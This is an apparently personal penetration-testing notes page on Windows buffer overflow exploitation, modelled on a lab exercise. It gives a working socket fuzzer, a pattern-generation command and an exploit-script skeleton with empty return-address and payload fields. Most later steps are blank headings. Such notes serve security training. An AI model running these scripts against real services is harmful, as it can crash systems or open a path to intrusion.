---
title: Buffer Overflow
layout: default
nav_order: 3
parent: Exploitation

---

# Buffer Overflow
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### **Windows Buffer Overflow**
Useful Reference - https://liodeus.github.io/2020/08/11/bufferOverflow.html#mona-configuration

#### <ins>Fuzzing Application</ins>
- Fuzzing Script

```python
#!/usr/bin/env python3
import argparse, socket, time, sys

# Add arguments for IP and port
parser = argparse.ArgumentParser()
parser.add_argument("ip", help="IP Address")
parser.add_argument("port",help="Port")
args = parser.parse_args()

ip = args.ip
port = args.port
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((args.ip, args.port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```


- Save `fuzzer.py` and make it executable

- Record the number at which the number of bytes where the application crash. 

- Generate a unique string using `msfvenom` that is the length of the bytes recorded to be at the point the program crashed


```bash
msf-pattern_create -l $BYES
# Example
msf-pattern_create -l 1800
```

#### <ins>Crash Application</ins>
- Exploit Script

```python
import socket, argparse

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="IP Address")
parser.add_argument("port",help="Port")
args = parser.parse_args()

ip = "10.10.105.251"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- Plug in the `msf_pattern-create` string inside of the `payload` variable of `exploit.py`

Example: 
```bash
padding = 
```

#### <ins>Finding EIP</ins>
#### <ins>Controlling ESP</ins>
#### <ins>Finding Bad Characters</ins>
#### <ins>Finding the JMP ESP</ins>
#### <ins>Generating Shell Code</ins>
#### <ins>Exploitation</ins>


### Linux Buffer Overflow
1.
2.
3.
4.
5.
6

Tracing through a Linux ELF executable

Use `readelf` to inspect function of executable
```bash
readelf -s <executable>
```

Tracing through a Windows executable
Use `objdump` to inspect function of executable
```bash
objdump -D <executable>.exe
```

